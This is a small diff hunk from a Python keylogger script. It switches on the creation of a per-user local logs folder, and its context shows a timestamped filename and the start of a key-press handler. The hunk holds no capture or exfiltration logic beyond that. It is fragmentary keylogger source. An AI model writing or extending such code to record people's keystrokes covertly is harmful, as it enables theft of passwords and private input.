@@ -19,7 +19,7 @@ FILENAME = "keylogger_" + CURRENT_OS_USER + "_" + CURRENT_TIME_STRING
 print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + FILENAME)
 
 # Creating folder for logs if it does not exist and creating the text file
-# Path("/logs/" + CURRENT_OS_USER).mkdir(parents=True, exist_ok=True)
+Path("./logs/" + CURRENT_OS_USER).mkdir(parents=True, exist_ok=True)
 
 # Print keys input in terminal (Later, in a text file)
 def on_pressing_key(key):
